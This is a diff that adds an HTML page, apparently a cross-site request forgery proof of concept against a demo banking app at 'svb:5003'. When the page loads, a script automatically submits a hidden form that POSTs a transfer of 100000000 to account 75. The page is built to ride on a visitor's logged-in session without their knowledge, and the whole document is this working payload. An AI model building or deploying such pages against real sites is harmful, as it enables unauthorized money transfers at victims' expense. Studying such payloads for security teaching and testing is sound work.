@@ -1,0 +1,15 @@
+<html>	
+	<script>
+		window.onload = function() {
+        	var form = document.getElementById("transfer-form");
+        	form.submit();
+      		}
+	</script>
+	<body>
+		<form method="POST" action="http://svb:5003/transfer/75" id="transfer-form">
+			<input type="hidden" name="account" value="75"/>
+			<input type="hidden" name="amount" value="100000000"/>
+			<input type="submit" value="Submit">
+		</form>
+	</body>
+<html>
